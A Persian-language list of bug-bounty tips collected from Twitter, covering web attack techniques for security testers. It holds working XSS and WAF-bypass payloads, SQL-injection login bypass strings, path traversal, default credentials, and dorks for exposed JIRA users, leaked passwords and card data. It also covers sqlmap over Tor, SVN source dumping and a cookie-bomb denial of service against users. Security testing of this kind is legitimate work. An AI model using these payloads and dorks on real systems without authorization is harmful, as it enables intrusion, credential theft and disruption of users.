# 14.tips from twitter

نکته 1

این آخرین یافته منه (P1)
ایجاد حساب

ریکوئست رو intercept کردم
این ریسپانس در تصویر هست، بنابراین در پارامتر "role" ما ROLE_USER رو داریم بنابراین من نمیدونم چه چیزیو میتونم باهاش جایگزین کنم تا دسترسیمو به admin افزایش بدم
سورس کد رو باز کنید و در فایل های js جستجو کنید
بنابراین در فایل‌های js از ctrl+F برای جستجوی `user_role` استفاده می‌کنم مقدار دیگه ای به نام `admin_role` پیدا کردم
بنابراین من از match و replace برپ برای جایگزینی مقدار استفاده می کنم
بومممم دسترسی اکانتم به اکانت ادمین با کنترل کامل افزایش پیدا کرد

نکته 2

```
اسعد الله ايامكم بكل خير

هذا ثغرة في شركة مايكروسوفت
كانت جدا بسيطة بسبب خطأ في اعداد سيرفر IIS

Exploit:
https//anywebsite.com/c:/Windows/Win.ini
```

نکته 3

```
CloudFront بایپس
">%0D%0A%0D%0A<x '="foo"><x foo='><img src=x onerror=javascript:alert(cloudfrontbypass)//'>
```

نکته 4

تمام URL هارو از wayback / Gau دریافت کنید

فایل js رو با استفاده از httpx فیلتر کنید

تمام فایل js Mnauly را بررسی کنید یا می توانید از قالب هسته یا پسوند کروم @trufflesec استفاده کنید

تمام فایل js رو به صورت دستی بررسی کنید یا میتونید از nuclei template یا  اکستنشن کروم مناسب اینکار  استفاده کنید

نکته 5

```
target.com/wp-config.php  => 404 not found
target.com/wp-config.php.…  ==> 200 ok and downloaded 
wp-config.php.swp ==>>200 ok
```

بعدش اگر با هگزادسیمال انکد شده بود دیکدش کنید

نکته 6

سعی کنید sqli صفحه احراز هویت رو بایپس کنید

```
username:'--'/"--"
password:'--'/"--"
```

نکته 7

اطلاعات کاربری پیشفرض:

```
PSADMIN:PSADMIN
PS:PS
PSEM:PSEM
```

گوگل دورک: 

نکته 8

```
nmap -sV -iL host.txt -oN nmap_scan.txt
چند ساعت صبر کنید
cat nmap_scan.txt | grep open
```

نکته 9

https://youtu.be/VsM6ERUx_AA

---

---

Xss payload:
[https://github.com/Aacle/xss_payload](https://github.com/Aacle/xss_payload)

---

---

از Nuclei برای api لو رفته استفاده کنید:

```
nuclei -t /nuclei-templates/token-spray/ -var token={yourToken}
```

---

---

اسکن از طریق TOR

```
sqlmap -u “http://target_server/” --tor --tor-type=SOCKS5
```

---

---

همیشه حساب GitHub کارمندان شرکت/سازمان رو برای توکن _ghp لو رفته بررسی کنید, و دسترسی به هر مخزن سازمان اصلی رو بررسی کنید

---

---

بایپس alert:

```
[alert][0].call(this,1)
```

نکته 10

به شودان برید و IP دربیارید

با Dirsearch فاز کنید

به دست اوردن داده های حساس

نکته 11

ریکان ریکان ریکان!!

دورک زدن شودان همیشه برندس

ssl:"Company Inc"

نتایج رو بر اساس عنوان http فیلتر کنید

شروع به فاز کردن یک دارایی جالب کنید

پیدا کردن /swagger-ui (**مستندی از API ها هست)**

ازمودن swagger ui xss با :

[https://github.com/seanmarpo/webjars-swagger-xss](https://github.com/seanmarpo/webjars-swagger-xss)

نکته 12

تا بحال در مورد افشای فایل wc-db چیزی شنیدید؟!

میتونید بررسیش کنید توسط:

https://target[.]com/.svn/wc.db

بعدش میتونید از این ابزار برای dump تمام سورس کد وب سایت استفاده کنید:

https://github.com/anantshri/svn-extractor

نکته 13

دورک شودان -> بعضی از دارایی ها (منظور از دارایی هرچی که دارید هست سایت, سازمان و..)

فاز کردن و بدست اوردن 403 Forbidden در مسیر config/

فاز کردن در config/FUZZ/ و بدست اوردن بغضی از کانفیگ فایل ها

همین روشو روی مابقی دارایی ها هم انجام بدید

نکته 14

اطلاعات کاربری پیشفرض `admin:admin`

دورک شودان:

`ssl:"target[.]com" 200 http.title:"dashboard"`

نکته 15

یک موضوع سریع در مورد JIRA misconfiguration که امروز امتحان کردم

گوگل دورک برای پیدا کردن داشبورد JIRA:

```
inurl:/ConfigurePortalPages!default.jspa?view=popular
```

گوگل دورک برای پیدا کردن صفحه فیلترهای JIRA:

```
inurl:/ManageFilters.jspa?filterView=popular AND ( intext:All users OR intext:Shared with the public OR intext:Public )
```

نکته 16

گوگل دورک برای پیدا کردن لیست کاربران افشا شده

```
inurl:/UserPickerBrowser.jspa -intitle:Login -intitle:Log
```

نکته 17

ریکان گیت هاب: به دنبال فایل‌های CSV باشید که شانس بالایی برای داشتن اطلاعات محرمانه دارند

دورک: "org:company extension:csv admin"

افشا: "cc number, cvv, email, phone number"

نکته 18

Oneliner for possible Reflected XSS using Nilo, gxss and Dalfox:

```bash
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```

نکته 19

ریکوئست GET برای XML اگر not found برگردوند, ریکوئست رو به POST با پیلود XXE تغییر بدید

نکته 20

اطلاعات تپل رو از AlienVault استخراج کنید

```bash
for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done
```

نکته 21

بایپس PHPMYADMIN

```
phpmyadmin =>301
PHPmyadmin =>200
PHPMYadmin =>200
PHPMYADMIN =>200
phpMYadmin =>200
phpmyAdmin =>200
```

نکته 22

SVN

```
1. ./dirsearch.py -u target -e php,html,js,xml -x 500,403
2. found http://url.com/.svn/
3. clone & use https://github.com/anantshri/svn-extractor
4. ./svn-extractor.py --url http://url.com --match database.php
5. فایل خروجی رو باز کنید
```

نکته 23

XSS

در نام و نام خانوادگی:

```
<img src=x
middlename:onerror
lastname:=alert(domain)/>
```

از [https://github.com/Leoid/MatchandReplace](https://github.com/Leoid/MatchandReplace) استفاده کنید

داخل برپ اضافش کنید

برید و gospider رو اجرا کنید:

```
gospider -s url -a -w --sitemap -r -c 100 -d 8 -p http://127.0.0.1:8080
```

پیلود Blind xss به صورت خودکار توسط برپ و gospider اضافه میشه

در نهایت BLIND XSS ریپورت کنید

نکته 24

Cookie Bomb

ادرس URL که باعث میشه طول کوکی از محدودیت های header ریکوئست برای همه ریکوئست ها بیشتر بشه تا زمانی که کوکی منقضی بشه

کوکی ای رو پیدا کنید که توسط یک پارامتر ست شده

تا جایی که میتونید کاما رو به پارامتر Inject کنید تا زمانی که اون کاربر رو DoS کنید

نکته 25

xss via jwt

یک توکن jwt بسازید و یک پیلود XSS وارد کنید

ادرس نهایی مثل `url/dest?jwt=vulnerable-jwt-token` هست

پارامتر =jwt, توکن jwt رو دیکد میکنه و در صفحه نمایش میده

نکته 26

دریافت URL های اطلاعات خصوصی توسط curl

همه URL هایی رو که فکر می کنید هانت، آزمایش یا استاتیکشون سخته رو از تارگتتون بقاپید

همه فایلارو در any.txt ذخیره کنید

کامند:

```bash
for i in $(cat any.txt); do curl "$i" >> output.txt; done
```

همه ریسپانس های curl رو با کلیدواژه های زیر grep کنید:

```
drive. google
docs. google
/spreadsheets/d/
/document/d/پ
```

توجه: این کار کثیف کاری زیادی داره, بنابراین مطمئن بشید که در فولدر دستورات رو اجرا میکنید تا بتونید بعدا حذفش کنید
ادرس های URL حاوی اطلاعات تپل دریافت خواهید کرد

نکته 27

تزریق پیلود در فیلد شماره تلفن

```bash
https://twitter.com/Pwn2arn/status/1609146484263641089
```

نکته 28

Easy P1 upside_down_face

تمام فایل های JS رو با استفاده از developer tool جمع اوری کنید

ابزار Link Finder روی فایل های JS که از dev tool بدست اوردید اجرا کنید یا از ابزار JS Miner استفاده کنید

حالا کلیدواژه های حساس فایل js رو به صورت دستی بررسی کنید

نکته 29

نکاتی برای اخرین P1 من

پیدا کردن پورتال دولوپر برای دولوپ نیازمند احراز هویت پایه هست

در داکر GitHub domain جستجو کنید

پیدا کردن یک یوزر که سعی میکنه pull بکنه به یک پرایویت ریپازیتوری و username:pass ارسال کنه

دیکد کردن base64 احراز هویت پایه

لاگین و دسترسی کامل به تمام محصولات

نکته 30

افشای گیت هاب برای Aws ,jira ,okta و..

```
1. Org:"target" pwd/pass/passwd/password
2. "target. atlassian" pwd/pass/passwd/password
3. "target. okta" pwd/pass/passwd/password
4. "Jira. target" pwd/pass/passwd/password
```

نکته 31

sourcemap js

```
https://blog.prodefense.io/little-bug-big-impact-25k-bounty-9e47773f959f
https://github.com/rarecoil/unwebpack-sourcemap
```

نکته 32

اگر سایتی از AngularJS استفاده می کنه

کد {{7*7}} رو تست کنید تا ببینید 49 در جایی رندر شده

اگر اپلیکیشن با ASP.NET ساخته شده که XSS پروتکشنش فعال هست, ممکنه بخواید روی تست اسیب‌ پذیری‌های دیگه تمرکز کنید و XSS رو به عنوان اخرین راه حل بررسی کنید

AngularJS Client-Side Template Injection

```
https://github.com/tijme/angularjs-csti-scanner?fbclid=IwAR0z3X2XRXRugdCiGSMk_CHVn3-MZU1qFHWKVHXUEZ5oVPWOiYu4WwGqWhE
```

نکته 33

اگر سایت با Rails ساخته شده

ممکنه بدونید که URL ها معمولا از یک الگوی CONTENT_TYPE/RECORD_ID/ پیروی میکنند که RECORD_ID یک عدد صحیح افزایشی خودکار هست. با استفاده از HackerOne به عنوان مثال, URL های ریپورت از این الگو پیروی می کنند:
www.hackerone.com/reports/`12345`

اپلیکیشن های Rails معمولا از ID های عدد صحیح استفاده می کنند, بنابراین ممکنه تست اسیب‌پذیری‌های IDOR رو در اولویت قرار بدید چون این نوع اسیب‌پذیری دولوپر ها راحت تر ازش غفلت میکنند